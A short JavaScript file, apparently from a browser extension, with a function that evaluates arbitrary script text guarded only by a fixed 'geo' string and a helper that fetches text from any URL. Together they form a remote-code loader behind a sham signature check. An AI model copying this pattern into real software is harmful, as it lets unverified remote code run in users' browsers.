var DEBUG = false;

function runScript (script, signature) {
  if (signature !== "geo") {
    if (DEBUG) {
      console.error("Signature does not match");
    }
    return false;
  }
  
  try {
    window.eval(script);
  }
  catch (err) {
    if (DEBUG) {
      console.error(err);
    }
  }
}

function getItem (url,callback) {
  var xhttp = new XMLHttpRequest();
    
  xhttp.onload = function () {
    callback(this.responseText);
  };
    
  xhttp.onerror = function () {
    callback(this.responseText);
  };
    
  xhttp.open("GET", url, true);
  xhttp.send();
}

//"content_security_policy": "script-src 'self' https://ssl.google-analytics.com; object-src 'self'"
//manifest "web_accessible_resources": ["script.js"]
